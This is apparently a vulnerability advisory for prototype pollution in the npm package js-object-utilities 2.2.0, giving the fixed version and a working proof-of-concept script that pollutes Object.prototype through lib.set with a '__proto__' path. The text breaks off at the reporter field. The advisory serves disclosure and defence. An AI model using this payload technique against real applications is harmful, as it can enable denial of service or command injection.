title: "js-object-utilities Vulnerable to Prototype Pollution"
description: "**Vulnerability type:**\nPrototype Pollution\n\n**Affected Package:**\n*
  Product: js-object-utilities\n* Version: 2.2.0\n\n**Remedy:**\n\nUpdate package
  to version 2.2.1.\n\n**Vulnerability Location(s):**\n```js\nat module.exports (/node_modules/js-object-utilities/dist/set.js:16:29)\n```\n\n**Description:**\n\nThe
  latest version of `js-object-utilities (2.2.0)`, (previous versions are also affected),
  is vulnerable to Prototype Pollution through the entry function(s) `lib.set`. An
  attacker can supply a payload with Object.prototype setter to introduce or modify
  properties within the global prototype chain, causing denial of service (DoS) a
  the minimum consequence.\n\nMoreover, the consequences of this vulnerability can
  escalate to other injection-based attacks, depending on how the library integrates
  within the application. For instance, if the polluted property propagates to sensitive
  Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary
  commands within the application's context.\n\n**PoC:**\n\n```bash\n// install the
  package with the latest version\n~$ npm install js-object-utilities@2.2.0\n// run
  the script mentioned below\n~$ node poc.js\n//The expected output (if the code still
  vulnerable) is below.\n// Note that the output may slightly differs from function
  to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n```\n\n```js\n//
  poc.js\n(async () => {\nconst lib = await import('js-object-utilities');\nvar someObj
  = {}\nconsole.log(\"Before Attack: \", JSON.stringify({}.__proto__));\ntry {\n//
  for multiple functions, uncomment only one for each execution.\nReflect.apply(lib.set,
  {}, [someObj, \"__proto__.pollutedKey\", 123]);\n} catch (e) { }\nconsole.log(\"After
  Attack: \", JSON.stringify({}.__proto__));\ndelete Object.prototype.pollutedKey;\n})();\n```\n\n**Reporter
